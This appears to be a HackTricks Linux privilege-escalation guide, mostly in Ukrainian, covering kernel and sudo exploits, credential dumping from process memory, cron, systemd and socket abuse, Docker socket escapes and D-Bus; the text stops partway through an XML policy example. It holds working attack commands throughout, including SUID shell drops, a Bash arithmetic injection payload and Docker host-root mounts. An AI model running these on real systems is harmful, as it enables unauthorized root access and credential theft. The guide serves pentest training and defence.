# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про OS

Почнемо отримувати деякі відомості про запущену OS
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права на запис у будь-яку папку всередині змінної `PATH`** ви можете підмінити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про оточення

Чи містять змінні середовища цікаву інформацію, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і наявність exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Тут можна знайти хороший список вразливих ядер та деякі вже **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з цього ресурсу, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустіть IN victim, лише перевіряє exploits для kernel 2.x)

Завжди **пошукайте версію kernel в Google**, можливо ваша версія kernel згадується в якомусь exploit, і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

На основі вразливих версій sudo, які з'являються в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють неповноважним локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, коли файл `/etc/nsswitch.conf` використовується з каталогу, контрольованого користувачем.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойта переконайтеся, що ваша версія `sudo` вразлива і що вона підтримує функцію `chroot`.

Для додаткової інформації зверніться до оригінальної [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не пройшла

Перегляньте **smasher2 box of HTB** як приклад того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткове system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перерахуйте можливі заходи захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви всередині docker container, ви можете спробувати втекти з нього:

{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і розмонтовано**, де і чому. Якщо щось розмонтовано, ви можете спробувати змонтувати це і перевірити на наявність конфіденційної інформації.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічити корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **встановлено будь-який компілятор**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендовано скомпілювати його на машині, в якій ви збираєтесь його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна використати для escalating privileges…\
Рекомендується вручну перевіряти версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використовувати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на цій машині.

> [!NOTE] > _Зауважте, що ці команди покажуть багато інформації, яка здебільшого буде марною, тому рекомендується використовувати такі застосунки, як OpenVAS або подібні, які перевіряють, чи будь-яка встановлена версія програмного забезпечення вразлива щодо відомих exploits_

## Processes

Перегляньте **які саме процеси** виконуються і перевірте, чи який-небудь процес не має **більше привілеїв, ніж повинен** (можливо, tomcat запущено від root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу, **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також вони показують **права доступу кожного відображеного регіону**. Псевдо-файл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **регіони пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **seek into the mem file and dump all readable regions** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. До віртуального простору адрес ядра можна звертатися за допомогою /dev/kmem.\
Зазвичай, `/dev/mem` доступний для читання лише користувачем **root** та групою **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це для Linux переосмислення класичного інструмента ProcDump із набору Sysinternals для Windows. Отримати його можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну зняти вимоги root і зробити дамп процесу, що належить вам
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump процес (див. попередні розділи, щоб знайти різні способи dump пам'яті процесу) і шукати credentials всередині пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **викрадати облікові дані у відкритому вигляді з пам'яті** та з деяких **відомих файлів**. Він потребує привілеїв root для коректної роботи.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) запущений як root — web-based scheduler privesc

Якщо веб-панель “Crontab UI” (alseambusher/crontab-ui) запущена як root і прив’язана лише до loopback, до неї все одно можна дістатися через SSH local port-forwarding та створити привілейовану задачу для privesc.

Типовий ланцюжок
- Знайти порт, доступний лише на loopback (наприклад, 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
- Резервні копії/скрипти з `zip -P <password>`
- systemd unit, що містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Пробросити тунель і залогінитися:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити завдання з високими привілеями та виконати негайно (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Зміцнення
- Не запускайте Crontab UI від імені root; обмежте його виконання виділеним користувачем з мінімальними правами
- Прив'язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте паролі повторно
- Уникайте вбудовування секретів в unit files; використовуйте сховища секретів або EnvironmentFile, доступний лише для root
- Увімкніть аудит/логування для запусків задач за вимогою



Перевірте, чи якась запланована задача уразлива. Можливо, ви зможете скористатися скриптом, що виконується від імені root (wildcard vuln? чи можна модифікувати файли, які використовує root? use symlinks? створити специфічні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Наприклад, у файлі _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо в цьому crontab root намагається виконати команду або скрипт без встановлення PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо скрипт, що виконується від імені root, містить “**\***” у команді, ви можете скористатися цим, щоб спричинити небажані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard знаходиться після шляху, наприклад** _**/some/path/***_**, це не є вразливим (навіть** _**./***_ **теж не є вразливим).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **можете змінити cron script**, який виконується від імені root, ви дуже легко можете отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, виконуваний root, використовує **каталог, до якого ви маєте повний доступ**, можливо, буде корисно видалити цей каталог і **створити symlink-каталог, що вказує на інший**, який містить скрипт під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams іноді «sign» cron-driven binaries шляхом вивантаження кастомної ELF-секції і grep'у по vendor string перед виконанням їх від імені root. Якщо цей binary є group-writable (наприклад, `/opt/AV/periodic-checks/monitor` належить `root:devs 770`) і ви можете leak the signing material, ви можете підробити секцію і захопити cron task:

1. Use `pspy` щоб зафіксувати flow верифікації. У прикладі Era, root виконував `objcopy --dump-section .text_sig=text_sig_section.bin monitor` після чого `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` і потім виконував файл.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) і вбудуйте сертифікат у `.text_sig`, щоб grep пройшов:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть запланований binary, зберігаючи execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Чекайте наступного запуску cron; коли наївна signature check пройде, ваш payload виконається від імені root.

### Frequent cron jobs

Ви можете моніторити процеси, щоб знаходити ті, що виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **відсортувати за менш виконуваними командами** і видалити команди, що виконувалися найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно відстежуватиме та перелічуватиме кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **поставивши символ повернення каретки після коментаря** (без символу нового рядка), і cron job буде працювати. Приклад (зауважте символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Служби

### Доступні для запису _.service_ файли

Перевірте, чи можете ви записати будь-який файл `.service`, якщо можете, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться чекати, поки машина не буде перезавантажена).\
Наприклад, створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права запису на бінарні файли, які виконуються службами**, ви можете змінити їх на backdoors, тож коли служби будуть повторно виконані, backdoors також виконаються.

### systemd PATH - Відносні шляхи

Ви можете переглянути PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **write** у будь-якій із папок цього шляху, можливо, ви зможете **escalate privileges**. Потрібно шукати **relative paths being used on service configurations** у файлах конфігурації, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Тоді створіть **executable** з **same name as the relative path binary** всередині папки PATH systemd, у яку ви маєте права запису, і коли службі буде наказано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (звичайно непривілейовані користувачі не можуть запускати/зупиняти служби, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтеся більше про services за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit-файли, чиє ім'я закінчується на `**.timer**`, які керують `**.service**` файлами або подіями. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку календарних подій і монотонних часових подій та можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його запускати наявні одиниці systemd.unit (наприклад, `.service` або `.target`).
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Одиниця (Unit), яку потрібно активувати, коли цей timer спливає. Аргумент — це unit name, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням посилається на service з тією ж назвою, що й timer unit, за винятком суфікса. (Див. вище.) Рекомендується, щоб unit name, який активується, і unit name timer unit мали однакові назви, за винятком суфікса.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад, `.service`), який **виконує записуваний бінарний файл**
- Знайти systemd unit, який **виконує відносний шлях** і над яким ви маєте **права на запис** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтесь більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні root privileges і потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється окрема інстанція сервісу і їй передається лише сокет з'єднання. Якщо **false**, усі сокети прослуховування **передаються до запущеного service unit'а**, і створюється лише один service unit для всіх з'єднань. Це значення ігнорується для datagram сокетів і FIFO, де один service unit безумовно обробляє весь вхідний трафік. **Defaults to false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або кілька командних рядків, які **виконуються перед** або **після** створення і прив'язки прослуховуваних **сокетів**/FIFO відповідно. Перший токен командного рядка повинен бути абсолютним шляхом до файлу, після нього йдуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** закриття та видалення прослуховуваних **сокетів**/FIFO відповідно.
- `Service`: Визначає ім'я **service** unit, який потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена тільки для сокетів з `Accept=no`. За замовчуванням використовується сервіс з тією ж назвою, що й сокет (із заміненим суфіксом). У більшості випадків використання цієї опції не є необхідним.

### Файли .socket, доступні для запису

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Зверніть увагу, що система має використовувати саме цю конфігурацію `.socket` файлу, інакше backdoor не буде виконано_

### Сокети, доступні для запису

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Перелічення Unix Sockets
```bash
netstat -a -p --unix
```
### Низькорівневе з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть існувати деякі **sockets listening for HTTP** запити (_Я не маю на увазі .socket files, а ті файли, які функціонують як unix sockets_). Перевірити це можна за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запити, то ви можете **спілкуватися** з ним і, можливо, **використати якусь вразливість**.

### Docker socket, доступний для запису

Docker socket, який часто знаходиться за шляхом `/var/run/docker.sock`, — це критичний файл, який потрібно захистити. За замовчуванням на нього можна записувати користувачу `root` та членам групи `docker`. Наявність доступу на запис до цього сокета може призвести до privilege escalation. Нижче пояснення, як це можна зробити, а також альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є доступ на запис до Docker socket, ви можете escalate privileges, використовуючи такі команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з доступом root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна використовувати через Docker API та команди `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування з'єднання `socat` ви можете виконувати команди безпосередньо в контейнері з доступом root до файлової системи хоста.

### Інше

Зверніть увагу, що якщо у вас є права на запис у docker socket, тому що ви **знаходитесь у групі `docker`**, у вас є [**більше способів підвищити привілеї**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API слухає на порту,** ви також можете зуміти скомпрометувати його](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **ще способи вийти з docker або зловживати ним для escalate privileges** в:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної комунікації (IPC), яка дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена для сучасної системи Linux, вона пропонує надійну основу для різних форм комунікації між додатками.

Система універсальна: підтримує базовий IPC, що покращує обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона полегшує трансляцію подій або сигналів, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth-демона про вхідний виклик може примусити музичний програвач приглушити звук, покращуючи користувацький досвід. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між додатками, оптимізуючи раніше складні процеси.

D-Bus працює за моделлю **allow/deny model**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі сумарного ефекту збігу політик. Ці політики визначають взаємодії з шиною, потенційно дозволяючи privilege escalation через експлуатацію цих дозволів.

Приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче, де детально описані дозволи для користувача root щодо володіння, відправлення та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики з контекстом "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
